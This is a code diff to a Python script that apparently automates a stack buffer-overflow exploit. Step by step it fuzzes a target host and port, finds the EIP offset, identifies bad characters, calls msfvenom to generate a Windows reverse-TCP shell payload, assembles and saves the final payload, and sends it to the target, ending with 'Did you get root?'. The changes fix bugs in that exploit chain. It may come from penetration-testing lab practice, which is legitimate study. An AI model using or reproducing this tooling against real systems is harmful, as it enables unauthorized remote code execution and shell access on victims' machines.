@@ -138,7 +138,7 @@ def continue_msg():
 def increase_len_msg(_char_length):
     global _delimiter
     msg = f'{_delimiter}[+] Your current buffer length is set to {_char_length} bytes.\n' \
-          f'[?] Would you like to increase that to widen the buffer? (Y|N)\n'
+          f'[?] Would you like to change this buffer? (Y|N)\n'
     response = input(msg).lower()
     if response == 'y' or response == 'yes':
         msg = f'Please enter the length in ascii characters you would like:\n\t' \
@@ -225,20 +225,21 @@ def interactive_sanitize(_obj, _msg, _type):
     return _obj
 
 
-def test_ascii_at_offset(_offset):
+def test_ascii_at_offset(temp_offset):
     output_dict = {}
     msg = 'Please input 4 ASCII Chars for testing offset: '
-    test_chars = ''
+    test_chars = input(msg)
+    test_chars = interactive_sanitize(test_chars, msg, str)
     while len(test_chars) != 4:
         test_chars = input(msg)
         test_chars = interactive_sanitize(test_chars, msg, str)
-    a_buffer = 'A' * _offset
-    b_buffer = str(test_chars)
+    a_buffer = 'A' * temp_offset
+    b_buffer = f'{test_chars}'
     _buffer = []
     for char in test_chars:
         _buffer.append(codecs.encode(bytes(char, encoding='utf-8'), "hex"))
     hex_equiv = b''.join(_buffer)
-    print(f'\nHex Equivalent: {hex_equiv}\n')
+    print(f'\n[i] Hex Equivalent:\t\t\t{str(hex_equiv)}')
     c_buffer = 'C' * 90
     new_var = f'{a_buffer}{b_buffer}{c_buffer}'
     output_dict['reg_test_word'] = hex_equiv
@@ -308,6 +309,8 @@ def fuzz_test(_ip, _port, _char_length):
 
 
 def loop_bad_char_test(_payload, _ip, _port, _reg_test_word, a_buffer):
+    global ip
+    global port
     global _delimiter
     global bad_chars
     global _known_bad_chars
@@ -315,7 +318,7 @@ def loop_bad_char_test(_payload, _ip, _port, _reg_test_word, a_buffer):
     global exit_option
     full_len = len(_payload)
     print(f'{_delimiter}\n[i] Current KB Hex Characters:\t{", ".join(_known_bad_chars)}\n')
-    result = send_var(_payload, _ip, _port)
+    result = send_var(_payload, ip, port)
     print(f'{_delimiter}Payload Result:\n[Expected]:\tfail\n[Actual]:\t{result}\n\n')
     msg0 = f'[?] Did you identify a bad hex character? (\'y\' for yes, \'n\' for no, \'q\' to quit)\n'
     msg1 = f'[?] Enter the identified hex character (Ex. Enter \'0a\' for \'0x0a\')\n\'n\' for no\n\'q\' to quit\n'
@@ -391,11 +394,11 @@ def main():
           f'your payload. Also, don\'t worry, you will have another chance to update this length before execution. ' \
           f'Would you like to update the variable length now? (Y/N)\n'
     response = input(msg).lower()
-    while response != 'y' and response != 'n':
+    while response.lower() != 'y' and response.lower() != 'n':
         response = input(msg)
-    if response == 'y':
+    if response.lower() == 'y':
         char_length = increase_len_msg(char_length)
-    elif response == 'n':
+    elif response.lower() == 'n':
         char_length = starting_buffer_length
     error_message = 'The variable \'char_length\' must be an integer.'
     char_length = interactive_sanitize(char_length, error_message, int)
@@ -429,7 +432,7 @@ def main():
     new_var = test_results['new_var']
     reg_test_word = test_results['reg_test_word']
     a_buffer = test_results['a_buffer']
-    c_buffer = test_results['c_buffer']
+    b_buffer = test_results['b_buffer']
     reg_test_word_reverse = endian_reverse(reg_test_word)
     send_var(new_var, ip, port)
     msg = f'[+] The updated variable now becomes....\nnew_var = (\'A\' * {offset}) +  \"{reg_test_word}\" + ' \
@@ -451,14 +454,13 @@ def main():
     new_len = increase_len_msg(char_length)
     while new_len == 'error':
         new_len = increase_len_msg(char_length)
-    # POTENTIAL REFACTOR might be needed here if there is a different target than pop3
-    c_updated_buff = ((new_len - offset - len(reg_test_word) - len(bad_chars)) * 'C')
+    c_updated_buff = ((new_len - offset - len(b_buffer) - len(bad_chars)) * 'C')
     eip_region = esp_region_msg()
     if eip_region == 'before':
-        payload = f'{a_buffer}{reg_test_word}{bad_chars}{c_updated_buff}'       # This will change.
+        payload = f'{a_buffer}{b_buffer}{bad_chars}{c_updated_buff}'       # This will change.
         # Need to investigate this and understand the steps for C Payload chosen before esp
     elif eip_region == 'at_or_after':
-        payload = f'{a_buffer}{reg_test_word}{bad_chars}{c_updated_buff}'
+        payload = f'{a_buffer}{b_buffer}{bad_chars}{c_updated_buff}'
     msg = f'[+] Update variable to:\n\tnew_var = (\'A\' * offset) + \"{reg_test_word}\" + bad_chars)\n\t' \
           f'[+] Final buffer written to \"cs.payload\"\n\t***Also, the bad_chars were added to aide ' \
           f'in the next step.\n'
@@ -492,10 +494,11 @@ def main():
               f'a valid hex memory address.')
         instr_address = interactive_sanitize(input(msg).lower(), msg, str)
     x = endian_reverse(instr_address)
+    instr_address_ascii = codecs.encode(x, "ascii")
     get_elapsed_time(start_time, 'loud')
     msg = f'Enter a nop sled amount to prepend to the payload. (0 is acceptable):\n'
     nop_sled = interactive_sanitize(input(msg), msg, int)
-    bad_byte_str = '"' + str("\\x".join(_known_bad_chars))
+    bad_byte_str = '"\\x' + str("\\x".join(_known_bad_chars)) + '"'
     sys_command = f'msfvenom --payload windows/shell_reverse_tcp LHOST={local_ip} LPORT={local_port} ' \
                   f'EXITFUNC=thread -f c -a x86 --platform windows -b {bad_byte_str} -n {nop_sled}'
     continue_msg()
@@ -513,9 +516,12 @@ def main():
             break
     shellcode = execute_command(sys_command)
     c_buffer_fill = (char_length - len(a_buffer) - 4 - len(shellcode)) * 'C'
-    final_payload = f'{a_buffer}{endian_reverse(instr_address)}{shellcode}{c_buffer_fill}'
+    final_payload = f'{a_buffer}{instr_address_ascii}{shellcode}{c_buffer_fill}'
+    f_out = open('cs.final_payload','w')
+    f_out.write(final_payload)
+    f_out.close()
     print('Payload Schema: {a_buffer}{endian_reverse(instr_address)}{shellcode}{c_buffer_fill}')
-    send_var(ip, port, final_payload)
+    send_var(final_payload, ip, port)
     print(f'{_delimiter}\nDid you get root? If not, start over from the beginning.\n{_delimiter}')
 
 
